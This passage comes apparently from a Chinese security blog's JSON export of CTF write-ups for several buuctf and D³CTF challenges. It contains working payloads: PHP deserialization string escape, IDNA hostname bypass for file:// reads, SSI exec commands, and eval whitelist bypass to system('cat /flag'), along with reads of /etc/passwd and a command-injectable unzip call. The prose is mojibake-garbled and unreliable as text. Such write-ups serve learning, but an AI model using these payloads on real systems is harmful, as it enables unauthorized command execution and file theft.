base64_encode(file_get_contents($profile['photo']));\n?>\n```\n\nè¿™é‡Œç»ˆäºçœ‹åˆ°äº†æˆ‘ä»¬å¸¸è§çš„æ¼æ´ç‚¹file_get_contents()å‡½æ•°\n\nå…ˆç»è¿‡ååºåˆ—åŒ–`$profile`æ•°ç»„\n\nç„¶åbase64ç¼–ç è¯»å‡º`$profile['photo']`\n\nä¹‹å‰çœ‹åˆ°config.phpä¸­å«æœ‰flag é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®©`$profile['photo']=config.php`ä¸å°±å¯ä»¥æ‹¿åˆ°flagäº†\n\n## è§£é¢˜ï¼š\n\nä½†æ˜¯photoéƒ¨åˆ†æ˜¯æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†ï¼Œå¹¶ä¸èƒ½ç›´æ¥è®©ä»–ç­‰äºconfig.phpå»æ‹¿åˆ°flag\n\nè¿™é‡Œå°±è¦ç”¨åˆ°ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸äº†\n\nåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­å­˜åœ¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨nicknameéƒ¨åˆ†æ„é€ å‡ºç¬¦åˆååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œåœ¨nicknameå­˜åœ¨config.phpè®©å…¶ååºåˆ—åŒ–åˆ°åè¾¹çš„photoéƒ¨åˆ†ï¼Œç›¸å½“äºæå‰ç»“æŸååºåˆ—åŒ–ï¼Œè®©åŸæœ¬photoéƒ¨åˆ†çš„ååºåˆ—åŒ–éƒ¨åˆ†ä¸¢å¤±ï¼Œä»è€Œè¾¾åˆ°ä½¿å¾—`$profile['photo']=config.php`\n\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨nicknameåºåˆ—åŒ–åçš„éƒ¨åˆ†å¡å…¥`\";s:5:\"photo\";s:10:\"config.php\";}`å…±33ä¸ªå­—ç¬¦\n\nè¿™é‡Œæ„é€ åˆæ³•ååºåˆ—åŒ–éƒ¨åˆ†å¾ˆå·§å¦™\n\nä¹‹å‰çœ‹ä»£ç å®ƒå­˜åœ¨ä¸€ä¸ªè¿‡æ»¤å™¨\n\n```cmake\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n```\n\nå¦‚æœæˆ‘ä»¬åªæ˜¯å•çº¯æŠŠ`\";s:5:\"photo\";s:10:\"config.php\";}`è¿™ä¸€éƒ¨åˆ†å¡å…¥nicknameé‚£ä¹ˆå®ƒç»è¿‡åºåˆ—åŒ–åï¼Œå†ç»è¿‡ååºåˆ—åŒ–å…¨éƒ¨éƒ¨åˆ†è¿˜æ˜¯å±äºnicknameéƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨ä»–åºåˆ—åŒ–åæ„é€ è®©ä»–å­—ç¬¦ä¸²æº¢å‡ºï¼Œç„¶åæº¢å‡ºéƒ¨åˆ†å°±ä¼šåˆ°photoéƒ¨åˆ†\n\næˆ‘ä»¬å¯ä»¥è®©`nickname=where`ç„¶ååºåˆ—åŒ–åç»è¿‡è¿‡æ»¤å™¨whereä¼šè¢«æ›¿æ¢ä¸ºhacker,whereä¸º5ä¸ªå­—ç¬¦ï¼Œè€Œhackerä¸º6ä¸ªå­—ç¬¦ï¼Œå¤šå‡ºä¸€ä¸ªå­—ç¬¦ï¼Œå°±è¿™æ ·ä½¿å¾—å®ƒåœ¨ååºåˆ—æ—¶è¿˜æ˜¯æŒ‰ç…§åŸæœ¬5ä¸ªå­—ç¬¦å»ååºåˆ—åŒ–ï¼Œè¿˜æœ‰ä¸€ä¸ªå­—ç¬¦å°±æº¢å‡ºé€ƒé€¸äº†ã€‚\n\nå¯ä»¥ç®€å•å€ŸåŠ©ä¸‹é¢çš„è„šæœ¬ç†è§£ï¼š\n\n```php\n<?php\nfunction filter($string) {     //çˆ¶ç±»filer\n    $escape = array('\\'', '\\\\\\\\');\n    $escape = '/' . implode('|', $escape) . '/';\n    $string = preg_replace($escape, '_', $string);  //ä¸€é¡¿æ“ä½œä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£åˆ™\n\n\n    $safe = array('select', 'insert', 'update', 'delete', 'where');\n    $safe = '/' . implode('|', $safe) . '/i';\n    return preg_replace($safe, 'hacker', $string);\n}\n$profile = array(\"phone\"=>\"12345678912\",\"email\"=>\"123@qq.com\",\"nickname\"=>\"where\",\"photo\"=>\"abc\");\n$a = serialize($profile);\necho $a;\necho \"\\n\";\necho filter($a);\n?>\n```\n\nè¾“å‡ºï¼šè¿™é‡Œç¬¬äºŒè¡Œhackeræ˜æ˜æ˜¯6ä¸ªå­—ç¬¦ä½†æ˜¯åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¿˜æ˜¯æ˜¾ç¤º5ï¼Œé‚£ä¹ˆå¤šä½™å‡ºæ¥çš„ä¸€ä¸ªå­—ç¬¦å°†ä¼šåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­é€ƒé€¸ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292442387-dfaaedff-1c6d-4dbc-a7bf-f889153b5ded.png)\n\né‚£ä¹ˆæˆ‘ä»¬å¡å…¥å­—ç¬¦ä¸²`\";s:5:\"photo\";s:10:\"config.php\";}`æ˜¯33ä¸ªå­—ç¬¦ï¼Œåˆ™éœ€è¦33ä¸ªwhere\n\nä½†æ˜¯ä¹‹å‰çœ‹åˆ°nicknameéƒ¨åˆ†ä¸èƒ½è¶…è¿‡10ä¸ªå­—ç¬¦\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292530703-ad1938a2-50bb-44cb-b17f-326547c2d3b9.png)\n\nè¿™é‡Œå¯ä»¥é€šè¿‡æ•°ç»„æ–¹å¼ç»•å¼€æ­£åˆ™åŒ¹é…å³`nickename[]`\n\nè¿™é‡Œ`$profile`å·²ç»æ˜¯ä¸€ä¸ªæ•°ç»„äº†ï¼Œå¦‚æœæ•°ç»„é‡Œé¢å†åŒ…å«ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ç¨æœ‰ä¸åŒã€‚\n\né€šè¿‡ä¸€ä¸ªè„šæœ¬æ¥å¸®åŠ©ç†è§£ï¼š\n\n```php\n<?php\n$a = array(\"name\"=>'Tom',\"age\"=>array(17));\necho serialize($a);\n?>\n```\n\nè¾“å‡ºï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292655293-2cc8bf95-340a-4112-8ae9-dfd90f65fb8c.png)\n\nä¼šæœ‰èŠ±æ‹¬å·å»åŒ…è£¹æ•°ç»„ä¸­çš„æ•°ç»„éƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨é—­åˆnicknameè¿™éƒ¨åˆ†æ—¶ä¹Ÿéœ€è¦ç‰¹æ„æ„é€ ä¸€ä¸ªå³èŠ±æ‹¬å·å»é—­åˆï¼Œä½¿å…¶æˆä¸ºåˆæ³•ååºåˆ—åŒ–éƒ¨åˆ†ã€‚\n\nå³`\";}s:5:\"photo\";s:10:\"config.php\";}`æˆ‘ä»¬éœ€è¦å¡å…¥34ä¸ªå­—ç¬¦\n\né‚£ä¹ˆnicknameå°±éœ€è¦æœ‰34ä¸ªwhere\n\n```\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\nå…¶ä»–éƒ¨åˆ†ä»»æ„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292841846-e07c45fe-820f-4146-9ee8-3ffd7c96068d.png)\n\nè¿›å…¥profile.phpå»è§£ç è¿™æ®µbase64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292879095-67419a27-16e3-4ec0-857c-ebabf61f6e6f.png)\n\nå°±å¯ä»¥æ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683292910852-9d761113-d1cd-4816-921d-e3b225f34f46.png)\n","tags":["ååºåˆ—åŒ–","ä»£ç å®¡è®¡","ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"],"categories":["buuctf"]},{"title":"buuctf-63-[SUCTF 2019]Pythonginx","url":"/post/487317b8.html","content":"\n[SUCTF 2019]Pythonginx\n\n<!--more-->\n\nä¸€é“å…³äºpythonè§£æidnaç¼–ç ä¸utf-8è§£ç åçš„å­—ç¬¦ä¸²çš„æ¼æ´é¢˜ç›®\n\nCVE-2019-9636ï¼šurlsplit ä¸å¤„ç† NFKC æ ‡å‡†åŒ–\n\nCVE-2019-10160ï¼šurlsplit NFKD æ ‡å‡†åŒ–æ¼æ´\n\næºç ï¼š\n\n```cmake\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname\n    if host == 'suctf.cc':\n        return \"æˆ‘æ‰Œ your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"æˆ‘æ‰Œ your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #å»æ‰ url ä¸­çš„ç©ºæ ¼\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"æˆ‘æ‰Œ your problem? 333\"\n   \n    <!-- Dont worry about the suctf.cc. Go on! -->\n    <!-- Do you know the nginx? -->\n```\n\nå®Œæ•´åˆ†æè¿‡ç¨‹ï¼š\n\n```python\nfrom flask import Flask, Blueprint, request, Response, escape ,render_template\nfrom urllib.parse import urlsplit, urlunsplit, unquote\nfrom urllib import parse\nimport urllib.request\nurl =\"http://www.baidu.com/index.php\"\nhost = parse.urlparse(url).hostname #ç¬¬ä¸€æ¬¡host\nprint(\"ç¬¬ä¸€æ¬¡host:\",host)\nparts = list(urlsplit(url))\nprint(\"parts:\",parts)\nhost = parts[1]  #ç¬¬äºŒæ¬¡host\nprint(\"ç¬¬äºŒæ¬¡host:\",host)\nnewhost = []\nprint(\"ä»¥ç‚¹åˆ†å‰²ï¼š\",host.split('.')) #ä»¥.ä¸ºåˆ†éš”ç¬¦è¿”å›ä¸€ä¸ªåˆ—è¡¨\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8')) #æ¼æ´äº§ç”Ÿç‚¹\nprint(\"ç»è¿‡idnaç¼–ç ä¸utf-8è§£ç ånewhost:\",newhost)\nparts[1] = '.'.join(newhost)\n#å»æ‰ url ä¸­çš„ç©ºæ ¼\nfinalUrl = urlunsplit(parts).split(' ')[0]\nhost = parse.urlparse(finalUrl).hostname  #ç¬¬ä¸‰æ¬¡host\nprint(\"ç¬¬ä¸‰æ¬¡host:\",host)\n```\n\nè¿™é‡Œè¯´è¯´hostä¸hostnameå§\n\n `host=hostname+':'+port(not 80)`  \n\n å¦‚æœhttpä½¿ç”¨é»˜è®¤çš„80ç«¯å£ï¼Œhostå¯ä»¥çœç•¥æ‰å†’å·+ç«¯å£ï¼Œçœ‹ä¸Šå»å’Œhostnameä¸€æ · \n\n```\nhost = parse.urlparse(url).hostname\n```\n\nè¿™ä¸€è¡Œè·å–æˆ‘ä»¬çš„hostname å¹¶ä¸”éœ€è¦æœ‰åè®®æ‰è¡Œ æ¯”å¦‚https://,http://,æˆ–è€…file://ï¼Œè¿™æ ·æ‰èƒ½è·å–åˆ°æˆ‘ä»¬çš„hostnameï¼Œä¹Ÿå°±æ˜¯payloadå½¢å¼ï¼Œå¿…é¡»ä¹Ÿæ˜¯è¿™æ ·åŒ…å«åè®®çš„å½¢å¼\n\nå…·ä½“åˆ†å‰²éƒ¨åˆ†ï¼Œå¯ä»¥å»çœ‹å®˜æ–¹æ‰‹å†Œhttps://docs.python.org/zh-cn/3/library/urllib.parse.html?highlight=urlsplit\n\nè¾“å‡ºï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210222158-baba3125-052f-4eae-b0eb-681f23c4953a.png)\n\nç›®æ ‡ç»•å¼€ç¬¬ä¸€ç¬¬äºŒä¸ªifï¼Œé‚£ä¹ˆæ“ä½œç‚¹å°±åœ¨è¿™é‡Œ\n\n```cmake\nfor h in host.split('.'):\n    newhost.append(h.encode('idna').decode('utf-8'))\n```\n\næ¯”å¦‚` â„† ` è¿™ä¸ªå­—ç¬¦ç»è¿‡ä»¥ä¸Šæ“ä½œä¹‹åå°±å˜ä¸ºäº†c/u\n\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©é¢˜ç›®éœ€è¦çš„`suctf.cc`æ”¹ä¸º`suctf.c â„† `ç„¶åç»è¿‡idnaç¼–ç utf-8è§£ç åï¼Œå˜ä¸ºæˆ‘ä»¬éœ€è¦çš„suctf.cc/u\n\nè¿˜éœ€è¦äº†è§£ä¸€äº›å…³äºnginxçš„é‡è¦æ–‡ä»¶ä½ç½®ï¼š\n\n- é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx\n- ä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf\n- ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service\n- æ¨¡å—ï¼š/usr/lisb64/nginx/modules\n- åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx\n- ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html\n- æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx\n- é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š/usr/local/nginx/conf/nginx.conf\n\nå…ˆæ¥æ‰¾flagæ–‡ä»¶çš„ä½ç½®ï¼Œçœ‹äº†wp\n\npayload:`?url=file://suctf.câ„†sr/local/nginx/conf/nginx.conf`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683210794235-67212c4a-f398-4e90-9615-d84f0c656810.png)\n\nè¯»å°±è¡Œäº†`?url=file://suctf.câ„†sr/fffffflag`\n","tags":["python","nginx"],"categories":["buuctf"]},{"title":"buuctf-62-[BJDCTF2020]EasySearch","url":"/post/9c6e15d.html","content":"\n[BJDCTF2020]EasySearch\n\n<!--more-->\n\næ‰«ç½‘ç«™åå°ï¼Œbuuå¸¸å¸¸æ‰«ä¸å‡ºæ¥ç®—äº†ï¼Œç›´æ¥ä»ç½‘ä¸Šæ‰’ä¸€ä¸ª\n\nå‘ç°æœ‰/index.php.swp\n\næºç å¦‚ä¸‹ï¼š\n\n```cmake\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\néœ€è¦å¯†ç å‰å…­ä½md5å€¼ç­‰äº`6d0bc1`\n\nå€ŸåŠ©è„šæœ¬\n\n```python\nfrom hashlib import md5\n\n\nfor i in range(10000000):\n    if md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1':\n        print(i)\n```\n\néšä¾¿é€‰ä¸€ä¸ª 2020666\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037918710-62fadfa4-b94f-45b9-bf41-9ecf8f5ebd72.png)\n\n```\n/public/6a55805e27f57db992ebd9b47735c84cb7ec8e91.shtml\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683037955243-8985022f-0080-4da4-86cd-967c1e4c6651.png)\n\nçœ‹åˆ°è¿™é‡Œå¤§æ¦‚ç‡æ˜¯ssti ä½†æ˜¯æŠ“åŒ…çœ‹æ—¢ä¸æ˜¯pythonä¹Ÿä¸æ˜¯php æ‰€ä»¥ä¸ä¼šäº†\n\nçœ‹äº†wp æ‰å‘ç°æ˜¯æ²¡è§è¿‡çš„shtml\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038075990-bfd32873-f395-4af3-8019-feae3efe14ab.png)\n\nå…¶å®åœ¨æºç ä¸­ä¹Ÿæœ‰ç¨å¾®æç¤º\n\n ç¬¬17è¡Œ`$shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");`\n\nç›´æ¥ç”¨payload\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683038127194-eea19322-3722-45f8-8191-7dcc3e994406.png)\n\npayloadï¼š\n\nflagåœ¨ä¸Šå±‚ç›®å½•\n\n```\n<!--#exec cmd=\"ls ../\"-->\n<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683039208613-241c74dc-ae63-426a-b76c-fceeb8e41dba.png)\n","tags":["ssti","shtml"],"categories":["buuctf"]},{"title":"buuctf-55-[CISCN 2019 åˆèµ›]Love Math","url":"/post/102492d1.html","content":"\n[CISCN 2019 åˆèµ›]Love Math\n\n<!--more-->\n\nè¿™é“é¢˜å°±æ˜¯bypass åˆ©ç”¨è¿›åˆ¶è½¬æ¢å‡½æ•°æ„é€ rce æŒºä¸é”™çš„\n\næºç å¦‚ä¸‹:\n\n```cmake\n<?php\nerror_reporting(0);\n//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //ä¾‹å­ c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"å¤ªé•¿äº†ä¸ä¼šç®—\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\");\n        }\n    }\n    //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\");\n        }\n    }\n    //å¸®ä½ ç®—å‡ºç­”æ¡ˆ\n    eval('echo '.$content.';');\n}\n```\n\n## è§£æ³•ä¸€ï¼š\n\nåˆ©ç”¨è¿›åˆ¶è½¬æ¢å‡½æ•°\n\npayload:`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag`\n\nåˆ†æï¼š\n\n`c=$pi=base_convert(37907361743,10,36)(dechex(1598506324))`è¿™ä¸€æ­¥æ˜¯æ„é€ å‡º_GET\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033094045-2aedb2fb-1341-4c26-8fe7-a9cae55fc613.png)\n\nè¿™é‡Œç”¨36è¿›åˆ¶åŸå› æ˜¯åŒ…å«æ•°å­—å­—æ¯å¤šå¯ä»¥æ„é€ å‡½æ•°åå¾ˆæ–¹ä¾¿\n\né€‰æ‹©hex2binè¿™ä¸ªå‡½æ•°æ˜¯å› ä¸ºè¿™ä¸ªå‡½æ•°å¯ä»¥å°†16è¿›åˆ¶å­—ç¬¦ä¸²è½¬åŒ–ä¸º2è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè¿™é‡Œå¯ä»¥è¿™ä¹ˆç†è§£æˆ‘ä»¬å¸¸è§åˆ°çš„å­—ç¬¦ä¸²å°±æ˜¯2è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼ˆä¸ä¸¥è°¨ï¼‰ï¼Œè¿™é‡Œé¢èµ·äº†ä¸€ä¸ªç›¸å½“äºå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„ä½œç”¨\n\nå¤§æ¦‚å¦‚å›¾è¿™æ ·çš„ä½œç”¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033601976-34ae25d6-fd29-4fbb-a6b9-b8fb1a80feae.png)\n\næ‹†è§£ï¼š\n\n```\n$pi=_GET\n$_GET[pi]($_GET[cos])\npi=system cos=cat /flag\nsystem(cat /flag)\n```\n\næ³¨æ„è¿™é‡Œ`$pi`å’Œ`pi`æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼Œä¸€å¼€å§‹ææ··äº†ï¼Œè‡³äºè¿™é‡Œä¸ºä»€ä¹ˆé€‰æ‹©`pi`å’Œ`cos`ä½œä¸ºå‚æ•°åæ˜¯å› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°åå ä½æœ€å°‘ï¼Œå› ä¸ºé™åˆ¶æˆ‘ä»¬é•¿åº¦å¿…é¡»åœ¨80ä»¥å†…\n\n## è§£æ³•äºŒ\n\nåˆ©ç”¨getallheaders()å‡½æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683033809691-3f418625-2ff3-430c-a2a0-10762f2fc4eb.png)\n\nè¿”å›ä¸€ä¸ªæ•°ç»„\n\npaylaod:`?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})`\n\nç›¸å½“äºæ„é€ `exec(getallheaders(){1})`\n\nå› ä¸ºè¿”å›ä¸€ä¸ªæ•°ç»„æ‰€ä»¥åŸæ¥åº”è¯¥ä¸º`getallheaders()[1]`å› ä¸º`[]`è¢«å±è”½äº†,æ‰€ä»¥ç”¨`{}`bypass\n\nç„¶å1ä¸ºé”®å æ‰€ä»¥åœ¨è¯·æ±‚å¤´å¢åŠ ä¸€ä¸ª`1: cat/flag`å³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683034156126-623b55ac-0e55-40d8-a6bf-ff0e7c9e516c.png)\n","tags":["å‘½ä»¤æ‰§è¡Œ","RCEå¥‡æ·«æ–¹å¼","bypass"],"categories":["buuctf"]},{"title":"AntCTF x DÂ³CTFç®€å•å¤ç°","url":"/post/e2c24be6.html","content":"\nèœé¸¡çš„è‡ªæˆ‘ç¾è¾±\n\n<!--more-->\n\n# å‰è¨€\n\næœ‰ç¨å¾®çœ‹äº†ä¸‹è¿™ä¸ªæ¯”èµ›ï¼Œä¸€çœ¼å°±ä¸å±äºæˆ‘è¿™ä¸ªæ°´å¹³äººåšçš„ï¼Œç¨ç¨çœ‹äº†ä¸€é“æŠ«ç€webçš®çš„miscï¼Œæ„Ÿè§‰ç¨å¾®æœ‰ç‚¹æ€è·¯ï¼Œèµ›åçœ‹çœ‹å¤§ä½¬ä»¬çš„wpï¼Œç»™è‡ªå·±æ¶¨æ¶¨è§è¯†ã€‚\n\n# æ­£é¢˜\n\n## d3readfile(Misc)\n\nè€å¥—è·¯å…ˆè¯»è¯»`/etc/passwd`å¯ä»¥è¯»åˆ°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954270870-621e1a29-e228-4eb2-9d64-1c21454e7eea.png)\n\nå†çœ‹çœ‹ç¯å¢ƒå˜é‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954383884-d90e322b-4fe6-46b6-a14f-825692562e07.png)\n\nå‘ç°hint è§£ç å‘ç°æç¤º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954420464-5d98a90e-1a74-42b6-ae64-c64de031e97d.png)\n\næç¤ºå…³é”®å­—æ˜¯locate\n\nçœ‹äº†å¤§ä½¬çš„wpï¼šlocate å‘½ä»¤æ˜¯æŸ¥è¯¢æ–‡ä»¶æ‰€åœ¨ä½ç½®çš„ï¼Œä¼šåœ¨æœ¬åœ°ç¼“å­˜æ•°æ®åº“ï¼Œæ–‡ä»¶åä¸º:locate.db,ä¸åŒç‰ˆæœ¬ä¼¼ä¹ç¼“å­˜çš„ç›®å½•å¹¶ä¸ä¸€æ ·\n\né—®é—®chatgpt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954548792-8766f875-f44c-4f32-aafe-9e7f50cbafac.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682996671795-81e5f146-61a1-4df9-8a4c-2a24db39b17c.png)\n\nä¸åŒçš„linuxç³»ç»Ÿä½ç½®ä¸åŒ\n\n- Ubuntu / Debianï¼š/var/lib/mlocate/mlocate.db\n- CentOS / Fedora / RHELï¼š/var/lib/locatedb\n- Arch Linuxï¼š/var/lib/pacman/local/mlocate*/mtree\n- Gentoo: /var/cache/edb/locate.database\n- Slackware: /var/lib/slocate/slocate.db\n- FreeBSD: /var/db/locate.database\n- OpenSUSEï¼š/var/lib/slocate/slocate.db\n- Mageiaï¼š/var/lib/mageia/mlocate.db\n- Oracle Linuxï¼š/var/cache/locate/locatedb\n\næœ€åå‘ç°æ˜¯ \n\n```\nOracle Linuxï¼š/var/cache/locate/locatedb\n```\n\nå‘ç°flagè·¯å¾„ï¼š`opt/vwMDP4unF4cvqHrztduv4hpCw9H9Sdfh/UuRez4TstSQEXZpK74VoKWQc2KBubVZi/LcXAfeaD2KLrV8zBpuPdgsbVpGqLcykz/flag_1s_h3re_233`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954629044-6d77fc45-bf46-4e85-924e-9d2fe577e2ca.png)\n\nGet it!\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682954670000-70aae100-4ab6-45ae-8e9f-984d320f1abc.png)\n\n## d3cloud(Web)\n\nè¿™é¢˜çœ‹å¤§ä½¬WPæ˜¯unzipå¤„å‘½ä»¤æ³¨å…¥\n\nç•Œé¢uiä»€ä¹ˆç”¨éƒ½æ²¡æœ‰ ç›´æ¥è¿›adminåå° `/admin`\n\nè¦ç™»é™† `admin/admin`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683001433174-c5787435-e598-4d31-a52b-a50681371de4.png)\n\nå‘ç°ä¸€ä¸ªphpæ–‡ä»¶\n\nè¿™é‡Œçœ‹wpæ˜¯ä¸å®˜æ–¹æ–‡æ¡£ç›¸æ¯”å¤šäº†ç‚¹ä»£ç ï¼Œé‚£ä¹ˆåšè¿™é“é¢˜è¿˜éœ€è¦ç°åœºæ­ç¯å¢ƒå’Œä»£ç å®¡è®¡qwq tql\n\n```cmake\npublic function putFileAs($path, $file, $name, $options = [])\n    {\n        $supported_file = array('gif','jpg','jpeg','png','ico','zip','mp4','mp3','mkv','avi','txt');\n        $file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));\n        if (!in_array($file_type, $supported_file)) {\n            return false;\n        }\n        $stream = fopen($file->getRealPath(), 'r+');\n        $result = $this->put(\n            $path = trim($path.'/'.$name, '/'), $stream, $options\n        );\n        if (is_resource($stream)) {\n            fclose($stream);\n        }\n        if($file->getClientOriginalExtension() === \"zip\") {\n            $fs = popen(\"unzip -oq \". $this->driver->getAdapter()->getPathPrefix() . $name .\" -d \" . $this->driver->getAdapter()->getPathPrefix(),\"w\");\n            pclose($fs);\n        }\n        return $result ? $path : false;\n    